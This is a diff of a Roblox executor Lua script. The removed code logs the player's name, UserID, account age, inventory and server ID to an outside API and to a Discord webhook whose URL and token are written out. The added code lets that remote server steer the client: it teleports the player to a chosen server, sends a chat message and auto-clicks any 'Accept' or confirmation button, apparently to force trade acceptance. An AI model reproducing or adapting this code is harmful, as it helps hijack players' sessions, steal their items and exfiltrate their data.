@@ -1,107 +1,164 @@
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local TextChatService = game:GetService("TextChatService")
+local UserInputService = game:GetService("UserInputService")
 
--- Konfigurasi
-local jobId = tostring(game.JobId)
-local apiEndpoint = "https://api-beta-mocha-45.vercel.app/api/setInstanceId"
-local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
-local player = Players.LocalPlayer
-local playerName = player.Name
+-- Delta-compatible configuration
+local REDIS_API_URL = "https://api-beta-mocha-45.vercel.app/api"
+local PLACE_ID = 126884695634066
+local CHECK_INTERVAL = 15
+local INSTANCE_TIMEOUT = 120
+local CHAT_MESSAGE = "dsadadsadas"
 
--- Ambil fungsi http request yang tersedia dari executor
-local httpRequest = (http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request))
-
-if typeof(httpRequest) ~= "function" then
-    warn("❌ Executor tidak mendukung http request!")
-    return
-end
-
--- Fungsi bantu untuk request dengan error handling
-local function safeRequest(requestTable)
-    local success, response = pcall(function()
-        return httpRequest(requestTable)
-    end)
-    if not success then
-        warn("❌ Error saat melakukan HTTP request:", response)
+-- Delta-compatible HTTP request function
+local function makeHttpRequest(method, endpoint, body)
+    local requestFunc = http and http.request or http_request or request
+    if not requestFunc then
+        warn("HTTP function not available in Delta")
         return nil
     end
-    return response
-end
 
--- Fungsi untuk mendapatkan isi backpack
-local function getBackpackContents()
-    local contents = {}
-    local backpack = player:FindFirstChild("Backpack")
-    if not backpack then return "Backpack tidak ditemukan" end
-    
-    for _, item in ipairs(backpack:GetChildren()) do
-        table.insert(contents, item.Name)
-    end
-    
-    if #contents == 0 then
-        return "Backpack kosong"
-    else
-        return table.concat(contents, ", ")
-    end
-end
-
--- Kirim ke API
-local jsonData = HttpService:JSONEncode({ instanceId = jobId })
-local apiResponse = safeRequest({
-    Url = apiEndpoint,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
-    Body = jsonData
-})
-
-if apiResponse and apiResponse.StatusCode == 200 then
-    print("✅ InstanceId berhasil dikirim ke API:", jobId)
-else
-    warn("❌ Gagal kirim ke API:", apiResponse and apiResponse.StatusCode or "Tidak ada respons")
-end
-
--- Dapatkan isi backpack
-local backpackContents = getBackpackContents()
-
--- Kirim ke Discord Webhook
-local embed = {
-    ["username"] = "Logger",
-    ["embeds"] = {{
-        ["title"] = "🟢 Script Dijalankan",
-        ["description"] = string.format("**%s** menjalankan script\n📡 **JobId:** `%s`", playerName, jobId),
-        ["color"] = 65280, -- Hijau
-        ["timestamp"] = DateTime.now():ToIsoDate(),
-        ["fields"] = {
-            {
-                ["name"] = "🎒 Isi Backpack",
-                ["value"] = backpackContents,
-                ["inline"] = false
+    local url = REDIS_API_URL .. endpoint
+    local success, response = pcall(function()
+        return requestFunc({
+            Url = url,
+            Method = method,
+            Headers = {
+                ["Content-Type"] = "application/json"
             },
-            {
-                ["name"] = "👤 Info Player",
-                ["value"] = string.format("UserID: %d\nAccount Age: %d hari", player.UserId, player.AccountAge),
-                ["inline"] = true
-            }
-        },
-        ["footer"] = {
-            ["text"] = "Logger System"
-        }
-    }}
-}
+            Body = body and HttpService:JSONEncode(body) or nil
+        })
+    end)
 
-local webhookResponse = safeRequest({
-    Url = webhookUrl,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
-    Body = HttpService:JSONEncode(embed)
-})
+    return success and response or nil
+end
 
-if webhookResponse and webhookResponse.StatusCode == 200 then
-    print("✅ Webhook Discord terkirim!")
-else
-    warn("❌ Gagal kirim webhook:", webhookResponse and webhookResponse.StatusCode or "Tidak ada respons")
+-- ==============================================
+-- ONLY THIS FUNCTION HAS BEEN MODIFIED (IMPROVED ACCEPT BUTTON LOGIC)
+-- ==============================================
+local function clickAcceptButton()
+    local gui = Players.LocalPlayer:FindFirstChildOfClass("PlayerGui")
+    if not gui then 
+        warn("PlayerGui not found")
+        return false 
+    end
+
+    -- Enhanced button detection with priority:
+    -- 1. Exact "Accept" TextButton
+    -- 2. Buttons containing "accept" in name
+    -- 3. Common confirmation buttons
+    
+    local function tryClick(button)
+        if button and button.Visible and button.Active then
+            -- Method 1: Fire click event directly
+            local clickEvent = button:FindFirstChild("MouseButton1Click")
+            if clickEvent then
+                pcall(clickEvent.Fire, clickEvent)
+                return true
+            end
+            
+            -- Method 2: Simulate mouse click
+            pcall(function()
+                local absPos = button.AbsolutePosition
+                local absSize = button.AbsoluteSize
+                local center = absPos + absSize/2
+                
+                -- Double click for reliability
+                for i = 1, 2 do
+                    UserInputService:SendMouseButtonEvent(center.X, center.Y, 0, true, game, 1)
+                    task.wait(0.1)
+                    UserInputService:SendMouseButtonEvent(center.X, center.Y, 0, false, game, 1)
+                    task.wait(0.1)
+                end
+            end)
+            return true
+        end
+        return false
+    end
+
+    -- Search through all GUI elements
+    for _, screen in ipairs(gui:GetChildren()) do
+        if screen:IsA("ScreenGui") and screen.Enabled then
+            -- First pass: Look for exact "Accept" TextButton
+            for _, descendant in ipairs(screen:GetDescendants()) do
+                if descendant:IsA("TextButton") and string.lower(descendant.Text) == "accept" then
+                    if tryClick(descendant) then
+                        print("Clicked exact 'Accept' TextButton")
+                        return true
+                    end
+                end
+            end
+            
+            -- Second pass: Look for buttons containing "accept"
+            for _, descendant in ipairs(screen:GetDescendants()) do
+                if (descendant:IsA("TextButton") or descendant:IsA("ImageButton")) then
+                    local lowerName = string.lower(descendant.Name)
+                    if string.find(lowerName, "accept") then
+                        if tryClick(descendant) then
+                            print("Clicked button with 'accept' in name")
+                            return true
+                        end
+                    end
+                end
+            end
+            
+            -- Third pass: Common confirmation buttons
+            local commonNames = {"confirm", "join", "ok", "yes"}
+            for _, descendant in ipairs(screen:GetDescendants()) do
+                if (descendant:IsA("TextButton") or descendant:IsA("ImageButton")) then
+                    local lowerName = string.lower(descendant.Name)
+                    for _, name in ipairs(commonNames) do
+                        if string.find(lowerName, name) then
+                            if tryClick(descendant) then
+                                print("Clicked common confirmation button:", descendant.Name)
+                                return true
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    warn("No acceptable button found")
+    return false
+end
+-- ==============================================
+-- END OF MODIFIED FUNCTION
+-- ==============================================
+
+-- Main function with Delta compatibility (UNCHANGED)
+local function main()
+    while task.wait(CHECK_INTERVAL) do
+        local response = makeHttpRequest("GET", "/getInstanceId")
+        if response and response.StatusCode == 200 then
+            local success, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
+            if success and data.instanceId then
+                if data.instanceId == game.JobId then
+                    -- In correct instance
+                    pcall(function()
+                        TextChatService.TextChannels.RBXGeneral:SendAsync(CHAT_MESSAGE)
+                    end)
+                    
+                    -- Enhanced: Try clicking multiple times
+                    for i = 1, 3 do
+                        if clickAcceptButton() then break end
+                        task.wait(0.5)
+                    end
+                else
+                    -- Need to teleport
+                    pcall(function()
+                        TeleportService:TeleportToPlaceInstance(PLACE_ID, data.instanceId, Players.LocalPlayer)
+                    end)
+                end
+            end
+        end
+    end
+end
+
+-- Start script with error handling (UNCHANGED)
+local success, err = pcall(main)
+if not success then
+    warn("Script error:", err)
 end
